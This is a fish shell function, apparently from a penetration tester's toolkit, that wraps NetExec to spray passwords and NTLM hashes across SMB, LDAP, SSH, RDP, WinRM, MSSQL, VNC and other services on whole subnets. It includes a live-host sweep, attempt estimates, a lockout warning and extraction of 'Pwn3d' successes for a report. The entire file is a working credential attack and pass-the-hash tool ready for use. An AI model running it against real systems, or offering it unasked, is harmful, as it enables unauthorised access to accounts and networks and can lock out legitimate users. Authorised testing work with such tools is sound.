function spray --description "spray one or many credentials across every NetExec protocol"
    argparse \
        'u/user=+' 'U/userlist=+' \
        'p/pass=+' 'P/passlist=+' \
        'H/hash=+' 'F/hashlist=+' \
        'd/domain=' 'j/jitter=' \
        'l/local' 'b/paired' 'L/live' 'n/dry' 'v/verbose' \
        -- $argv
    or return 1

    # ---- target -----------------------------------------------------------
    if test (count $argv) -lt 1
        echo "usage: spray TARGET  (-u USER | -U FILE)  (-p PASS | -P FILE | -H HASH | -F FILE)  [opts]"
        echo "  TARGET     ip, host, cidr (10.0.0.0/24), range (10.0.0.1-50), or a hosts file"
        echo "  -u/-U      username / username list      (repeatable)"
        echo "  -p/-P      password / password list      (repeatable)"
        echo "  -H/-F      ntlm hash / hash list         (repeatable, pass-the-hash)"
        echo "  -d DOMAIN  domain            -j JITTER   throttle, e.g. 3 or 2-5"
        echo "  -l local   --local-auth      -b paired   line-by-line (--no-bruteforce)"
        echo "  -L live    credless smb sweep first, then spray only responders"
        echo "  -v verbose show every attempt on screen (default: only successes)"
        echo "  -n dry     print the plan and stop"
        echo "  passwords hit every protocol; hashes only smb ldap mssql winrm wmi rdp"
        return 1
    end
    set -l target $argv[1]

    # ---- gather credential sources ---------------------------------------
    # nxc takes many values after one flag and auto-detects file-vs-literal,
    # so literals and list files can ride in the same -u / -p / -H list.
    set -l users $_flag_user $_flag_userlist
    set -l passes $_flag_pass $_flag_passlist
    set -l hashes $_flag_hash $_flag_hashlist

    if test (count $users) -eq 0
        echo "[!] no username. -u USER and/or -U FILE (both repeatable)."
        return 1
    end
    if test (count $passes) -eq 0; and test (count $hashes) -eq 0
        echo "[!] no secret. Give passwords (-p/-P) and/or hashes (-H/-F)."
        return 1
    end

    # list files must exist, fail before touching the network
    for f in $_flag_userlist $_flag_passlist $_flag_hashlist
        if not test -r "$f"
            echo "[!] list file not readable: $f"
            return 1
        end
    end

    # ---- count each credential source, remembering files expand ----------
    # literals count as one; a list file counts its non-blank lines. The
    # display shows file(N) so the plan is honest about how big a list is.
    set -l nuser (count $_flag_user)
    set -l duser $_flag_user
    for f in $_flag_userlist
        set -l n (grep -cve '^[[:space:]]*$' $f)
        set nuser (math $nuser + $n)
        set -a duser "$f($n)"
    end
    set -l npass (count $_flag_pass)
    set -l dpass $_flag_pass
    for f in $_flag_passlist
        set -l n (grep -cve '^[[:space:]]*$' $f)
        set npass (math $npass + $n)
        set -a dpass "$f($n)"
    end
    set -l nhash (count $_flag_hash)
    set -l dhash $_flag_hash
    for f in $_flag_hashlist
        set -l n (grep -cve '^[[:space:]]*$' $f)
        set nhash (math $nhash + $n)
        set -a dhash "$f($n)"
    end

    # ---- flags that ride on every call -----------------------------------
    set -l globals --no-progress          # keeps the saved transcript clean
    set -l extra --continue-on-success    # find every valid key, do not stop at the first
    set -q _flag_paired; and set -a extra --no-bruteforce
    set -q _flag_local; and set -a extra --local-auth
    set -q _flag_domain; and set -a extra -d $_flag_domain
    set -q _flag_jitter; and set -a extra --jitter $_flag_jitter

    # ---- protocol sets ----------------------------------------------------
    # order is fast-and-safe first, slow last (rdp/vnc). password auth works
    # everywhere; an NTLM hash only means anything on the Windows auth
    # protocols, never on ssh/ftp/vnc/nfs.
    set -l pass_protos smb ldap ssh ftp mssql winrm wmi rdp vnc
    set -l hash_protos smb ldap mssql winrm wmi rdp
    if set -q _flag_local
        # local (SAM) auth only makes sense on the Windows services
        set pass_protos smb winrm wmi mssql rdp
        set hash_protos smb winrm wmi mssql rdp
    end

    # ---- live-host pre-sweep (opt-in) ------------------------------------
    # a whole /24 across nine protocols is brutal, rdp and vnc worst. -L does a
    # credless smb sweep first and then sprays only the hosts that answered.
    # note: this drops hosts with no SMB (an ssh-only linux box vanishes).
    set -l tsan (string replace -a / _ -- $target | string replace -a ' ' _)
    if set -q _flag_live
        set -l livefile "spray-live-$tsan.txt"
        echo "[*] -L: credless SMB sweep of $target to find live hosts first"
        __run nxc --no-progress smb $target | tee "spray-discover-$tsan.log" \
            | sed -r 's/\x1b\[[0-9;]*[A-Za-z]//g; s/[\x0e\x0f\r]//g' | grep -E '^SMB' | awk '{print $2}' \
            | sort -u >$livefile
        if not test -s $livefile
            echo "[!] no live SMB hosts in $target, nothing to spray. Check $livefile."
            return 1
        end
        echo "[*] "(wc -l <$livefile | string trim)" live host(s) -> $livefile"
        set target $livefile   # log/hits keep the original target name (tsan unchanged)
    end

    # ---- host count, for the attempt estimate ----------------------------
    set -l T 1
    set -l tnote "host"
    if test -r "$target"
        set T (grep -cve '^[[:space:]]*$' $target)
        set tnote "hosts (file)"
    else if string match -qr '/[0-9]+$' -- $target
        set -l mask (string split / -- $target)[2]
        if string match -qr '^[0-9]+$' -- $mask; and test $mask -le 32
            if test $mask -ge 31
                set T (math "2 ^ (32 - $mask)")
            else
                set T (math "2 ^ (32 - $mask) - 2")
            end
            set tnote "hosts (whole CIDR, upper bound)"
        end
    else if string match -qr '[0-9]+-[0-9]+$' -- $target
        set -l r (string match -r '([0-9]+)-([0-9]+)$' -- $target)
        set T (math "$r[3] - $r[2] + 1")
        set tnote "hosts (range)"
    end

    # ---- attempt estimate -------------------------------------------------
    # per wave: credential combos (cartesian, or line-by-line if paired),
    # times hosts, times the protocols that wave hits.
    set -l np (count $pass_protos)
    set -l nh (count $hash_protos)
    set -l att_p 0
    set -l att_h 0
    if test $npass -gt 0
        set -l cmb (math $nuser x $npass)
        set -q _flag_paired; and set cmb (test $nuser -ge $npass; and echo $nuser; or echo $npass)
        set att_p (math "$cmb * $T * $np")
    end
    if test $nhash -gt 0
        set -l cmb (math $nuser x $nhash)
        set -q _flag_paired; and set cmb (test $nuser -ge $nhash; and echo $nuser; or echo $nhash)
        set att_h (math "$cmb * $T * $nh")
    end
    set -l att_total (math "$att_p + $att_h")

    # ---- output files -----------------------------------------------------
    set -l log "spray-$tsan.log"
    set -l hits "spray-$tsan.hits"
    : >$log   # fresh transcript for this spray; __run still logs every command to ~/.cmdlog

    # ---- plan: print every command once, before running anything ---------
    set -l C (set_color -o cyan); set -l N (set_color normal); set -l D (set_color brblack)
    echo
    echo "$C── spray plan ─────────────────────────────────────────$N"
    printf "  target     %s   %s%s%s\n" $target $D $tnote $N
    printf "  users      %s%d%s   %s\n" $C $nuser $N (string join ', ' -- $duser)
    test $npass -gt 0; and printf "  passwords  %s%d%s   %s\n" $C $npass $N (string join ', ' -- $dpass)
    test $nhash -gt 0; and printf "  hashes     %s%d%s   %s\n" $C $nhash $N (string join ', ' -- $dhash)
    printf "  options    %s\n" (string join ' ' -- $extra)
    # attempt line: show the waves that actually run
    set -l br
    test $npass -gt 0; and set -a br "pw "$nuser"×"$npass"×"$T"h×"$np"p="$att_p
    test $nhash -gt 0; and set -a br "hash "$nuser"×"$nhash"×"$T"h×"$nh"p="$att_h
    printf "  attempts   %s~%d%s   %s\n" $C $att_total $N (string join '  +  ' -- $br)
    printf "  writing    %s  (hits -> %s)  all attempts saved, successes on screen\n" $log $hits

    # lockout guard: many secrets per user with no throttle is how you nuke an account
    set -l nsec (math "$npass + $nhash")
    if test $nsec -gt 1; and not set -q _flag_jitter; and not set -q _flag_paired
        echo "  $D! $nsec secrets per user, no --jitter: watch account lockout.$N"
        echo "  $D  add -j 3 (or -j 2-5) to throttle, or -b for line-by-line pairs.$N"
    end

    echo "$C── commands ───────────────────────────────────────────$N"
    if test $npass -gt 0
        for p in $pass_protos
            echo "  "(string join ' ' -- (string escape -- nxc $globals $p $target -u $users -p $passes $extra))
        end
    end
    if test $nhash -gt 0
        for p in $hash_protos
            echo "  "(string join ' ' -- (string escape -- nxc $globals $p $target -u $users -H $hashes $extra))
        end
    end
    echo "$C───────────────────────────────────────────────────────$N"
    echo

    if set -q _flag_dry
        echo "[*] --dry: plan only, nothing run."
        return 0
    end

    # ---- run --------------------------------------------------------------
    # tee is BEFORE the screen filter, so the file always gets everything
    # (banners + every attempt). Default screen view is successes only; -v
    # removes the filter and shows the full live output.
    if test $npass -gt 0
        for p in $pass_protos
            if set -q _flag_verbose
                __run nxc $globals $p $target -u $users -p $passes $extra | tee -a $log
            else
                __run nxc $globals $p $target -u $users -p $passes $extra | tee -a $log | grep --line-buffered -E '\[\+\]|Pwn3d'
            end
        end
    end
    if test $nhash -gt 0
        for p in $hash_protos
            if set -q _flag_verbose
                __run nxc $globals $p $target -u $users -H $hashes $extra | tee -a $log
            else
                __run nxc $globals $p $target -u $users -H $hashes $extra | tee -a $log | grep --line-buffered -E '\[\+\]|Pwn3d'
            end
        end
    end

    # ---- hits: pull the wins out of the transcript -----------------------
    # clean the saved transcript in place: the live view kept its colours,
    # the file should be paste-ready for the report. box-drawing stays.
    sed -ri 's/\x1b\[[0-9;]*[A-Za-z]//g; s/[\x0e\x0f\r]//g' $log
    grep -E '\[\+\]|Pwn3d' $log >$hits
    echo
    if test -s $hits
        echo "$C── hits ("(wc -l <$hits | string trim)") ─ from $hits ──$N"
        cat $hits | sed 's/^/  /'
    else
        echo "$D── no [+]/Pwn3d lines. Full transcript in $log ──$N"
    end
    set -q _flag_verbose; or echo "  $D(screen showed successes only; full run in $log, or re-run with -v)$N"
    echo
end